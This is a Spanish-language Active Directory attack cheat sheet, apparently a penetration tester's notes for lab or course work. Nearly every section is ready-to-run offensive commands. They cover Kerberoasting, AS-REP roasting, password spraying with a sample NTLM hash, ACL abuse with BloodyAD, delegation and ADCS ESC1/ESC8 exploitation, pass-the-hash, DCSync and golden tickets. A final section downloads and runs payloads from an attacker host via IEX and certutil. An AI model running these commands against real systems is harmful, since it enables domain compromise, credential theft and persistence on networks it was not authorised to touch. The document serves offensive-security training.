


## 1. Enumeración Inicial

### 🪟 Desde Windows (Nativo & PowerView/AD Module)

**Información Básica del Usuario y Grupos**

PowerShell

```
# Quién soy y qué privilegios tengo
whoami /all
whoami /priv

# Enumerar Usuarios y Grupos
Get-ADUser -Filter * | select SamAccountName
Get-ADGroupMember -Identity "Domain Admins"
Get-ADPrincipalGroupMembership -Identity <usuario>  # Ver a qué grupos pertenece un usuario

# Enumerar Computadoras
Get-ADComputer -Filter * | select Name
```

**Dominio y Bosque (Forest)**

PowerShell

```
# Información del Bosque y Dominios
Get-ADForest
(Get-ADForest).Domains

# Relaciones de Confianza (Trusts)
Get-ADTrust -Filter *
Get-DomainTrustMapping  # PowerView
Invoke-MapDomainTrust | Export-Csv trust.csv
```

Enumeración de ACLs (Listas de Control de Acceso)

Busca "quién puede hacer qué" sobre otros objetos.

PowerShell

```
# Buscar ACLs interesantes (PowerView)
Find-InterestingDomainAcl -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs

# Ver permisos sobre un objeto específico
Get-DomainObjectAcl -Identity "Administrator" -ResolveGUIDs -Verbose

# Ver mis permisos sobre el dominio
Get-DomainObjectAcl -Identity $env:USERNAME -ResolveGUIDs
```

**GPO (Políticas de Grupo)**

PowerShell

```
# Listar GPOs y enlaces
Get-DomainGPO
(Get-DomainOU -Identity "Students").gplink

# Buscar dónde un usuario es Admin Local vía GPO
Find-GPOComputerAdmin –ComputerName <TargetPC>
Find-GPOLocation -Identity <usuario>
```

### 🐧 Desde Linux (Kali / NetExec / BloodHound)

NetExec (SMB & LDAP)

La navaja suiza para enumeración rápida.

Bash

```
# Enumeración básica (SMB)
nxc smb <IP> -u user -p pass --users --groups --loggedon

# Enumeración de Dominio (LDAP)
nxc ldap <IP> -u user -p pass --trusted-for-delegation  # Delegaciones
nxc ldap <IP> -u user -p pass --asreproast              # Usuarios ASREPRoast
nxc ldap <IP> -u user -p pass --kerberoasting           # Usuarios Kerberoast
nxc ldap <IP> -u user -p pass -M laps                   # Chequear LAPS
```

**BloodHound (Recolección)**

Bash

```
# Remoto (Python)
bloodhound-python -u user -p pass -ns <IP_DC> -d <dominio> -c All

# Local (SharpHound.exe en Windows)
.\SharpHound.exe --collectionmethods All
```

---

## 2. Ataques de Kerberos

### AS-REP Roasting

Ataca usuarios que tienen "Do not require Kerberos preauthentication".

- **Concepto:** Solicitas un ticket AS-REP (cifrado con el hash del usuario) sin enviar credenciales. Luego lo crackeas.
    

Bash

```
# Linux (Impacket)
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip <IP_DC>

# Windows (Rubeus)
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### Kerberoasting

Ataca cuentas de servicio (Service Accounts) identificadas por tener un SPN.

- **Concepto:** Solicitas un ticket TGS para un servicio. El ticket viene cifrado con el hash NTLM de la cuenta de servicio.
    

Bash

```
# Linux (Impacket)
impacket-GetUserSPNs -dc-ip <IP_DC> domain/user:pass -request

# Windows (Rubeus)
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

### Pulverizado de contraseñas

Prueba una contraseña común contra muchos usuarios para evitar bloqueos.

Bash

```
# Kerbrute (Linux) - Más sigiloso (Pre-Auth check)
./kerbrute passwordspray -d domain.local --dc <IP_DC> users.txt 'Password123'

# Script para rociado de contraseñas
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +


```

---

## 3. Escalada de Privilegios (Abuso de ACLs)

Si tienes permisos especiales sobre objetos, úsalos para tomar control.

|**Permiso**|**Acción**|**Comando (BloodyAD - Kali)**|
|---|---|---|
|**GenericAll / WriteDACL**|Darte permisos DCSync|`bloodyAD -d domain -u user -p pass add dcsync 'user_attacker'`|
|**GenericWrite / All**|Resetear Password|`bloodyAD -d domain -u user -p pass set password 'Target' 'NewPass!'`|
|**WriteOwner**|Hacerte dueño del objeto|`bloodyAD -d domain -u user -p pass set owner 'Target' 'Attacker'`|
|**AddKeyCredentialLink**|Shadow Credentials|`certipy shadow auto -u user -p pass -account target`|
|**ForceChangePassword**|Cambiar pass (sin saber el anterior)|`net rpc password "Target" "NewPass" -U user%pass -S <IP>`|

---

## 4. Delegación de Kerberos

### Unconstrained Delegation

La máquina guarda los TGTs de cualquiera que se conecte a ella.

- **Ataque:** Comprometer la máquina, extraer TGTs (especialmente de Domain Admins) y reusarlos.
    
- **Herramienta:** `Rubeus monitor` + `SpoolSample` (PrinterBug) para forzar al DC a conectarse.
    

### Constrained Delegation

La cuenta solo puede delegar a servicios específicos, _pero_ si tienes el hash, puedes solicitar tickets para _cualquier_ usuario hacia ese servicio.

- **Requisito:** Hash NTLM del usuario/máquina con delegación.
    
- **Comando (Impacket):**
    
    Bash
    
    ```
    getST.py -spn cifs/target 'domain/user:pass' -impersonate Administrator
    ```
    

### Resource-Based Constrained Delegation (RBCD)

La delegación se configura en el objeto _destino_ (la víctima), no en el origen.

- **Requisito:** Permiso `GenericWrite` o `WriteProperty` sobre la máquina víctima.
    
- **Ataque:**
    
    1. Crear una máquina falsa (`addcomputer.py`).
        
    2. Escribir en `msDS-AllowedToActOnBehalfOfOtherIdentity` de la víctima apuntando a tu máquina falsa (`rbcd.py`).
        
    3. Pedir ticket de servicio (`getST.py`).
        

---

## 5. Active Directory Certificate Services (ADCS)

Herramienta principal: **Certipy** (Linux) o **Certify** (Windows).

### Enumeración de Vulnerabilidades

Bash

```
# Buscar plantillas vulnerables (ESC1, ESC8, etc.)
certipy find -u user@domain -p pass -dc-ip <IP> -vulnerable -stdout
```

### Vectores Principales

- **ESC1:** Plantilla permite `Client Authentication` y `Enrollee Supplies Subject` (tú dices quién eres).
    
    Bash
    
    ```
    # Explotación
    certipy req -u user -p pass -ca <CA_NAME> -template ESC1 -upn Administrator
    certipy auth -pfx administrator.pfx
    ```
    
- **ESC8 (Relay):** El servidor ADCS tiene Web Enrollment (HTTP) habilitado.
    
    Bash
    
    ```
    # Explotación
    1. certipy relay -target <IP_ADCS> -template DomainController
    2. Coercer / PetitPotam para forzar al DC a autenticarse contra ti.
    ```
    
- **ESC4:** Tienes permisos de escritura sobre una plantilla. La modificas para hacerla vulnerable a ESC1.
    
- **Certifried (CVE-2022-26923):** Creas una máquina, cambias su `dnsHostName` para que coincida con el DC, y pides certificado.
    

---

## 6. Movimiento Lateral

### Ejecución Remota

Bash

```
# WinRM (PowerShell Remoting) - Puerto 5985
evil-winrm -i <IP> -u user -p pass

# SMB (PsExec / SmbExec) - Puerto 445
impacket-psexec domain/user:pass@<IP>
impacket-smbexec domain/user:pass@<IP>

# WMI (Más sigiloso)
impacket-wmiexec domain/user:pass@<IP>
```

### Pass-The-Hash (PTH) & Pass-The-Ticket (PTT)

- **PTH:** Usar el hash NTLM en lugar de la contraseña.
    
    Bash
    
    ```
    nxc smb <IP> -u Administrator -H <NTLM_HASH>
    ```
    
- **PTT:** Inyectar un ticket Kerberos (`.ccache` o `.kirbi`) en la sesión.
    
    Bash
    
    ```
    export KRB5CCNAME=ticket.ccache
    impacket-psexec -k -no-pass target
    ```
    

---

## 7. Persistencia y Dominio Total

### DCSync

Simula ser un Controlador de Dominio para pedirle al DC real que replique las contraseñas (hashes).

- **Requisito:** Permisos `Replicating Directory Changes All`.
    
- **Comando:**
    
    Bash
    
    ```
    impacket-secretsdump domain/user:pass@<IP_DC> -just-dc-ntlm
    ```
    

### Golden Ticket

Falsificación total. Teniendo el hash `krbtgt`, puedes crear tickets válidos para cualquier usuario (incluso inexistentes) con persistencia de 10 años.

Bash

```
# Linux
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMINIO> Administrator
```

### LAPS y gMSA

Recuperación de contraseñas gestionadas.

Bash

```
# Leer password de LAPS
nxc ldap <IP> -u user -p pass -M laps
bloodyAD -d domain -u user -p pass get search --filter '(ms-mcs-admpwd=*)'

# Leer password de gMSA
nxc ldap <IP> -u user -p pass --gmsa
```

---

## 8. Transferencia de Archivos

Métodos rápidos para subir herramientas al objetivo.

**PowerShell (Fileless / Memoria)**

PowerShell

```
# Descargar y ejecutar en memoria (Bypass disco)
IEX (New-Object Net.WebClient).DownloadString('http://ATACANTE/script.ps1')
```

**CertUtil (Windows Nativo)**

PowerShell

```
# Descargar archivo
certutil -urlcache -split -f "http://ATACANTE/file.exe" "C:\Temp\file.exe"
```

**SMB Server (Python)**

Bash

```
# En Kali
impacket-smbserver share ./carpeta_local -smb2support

# En Windows (Víctima)
copy \\IP_KALI\share\file.exe C:\Windows\Temp\file.exe
```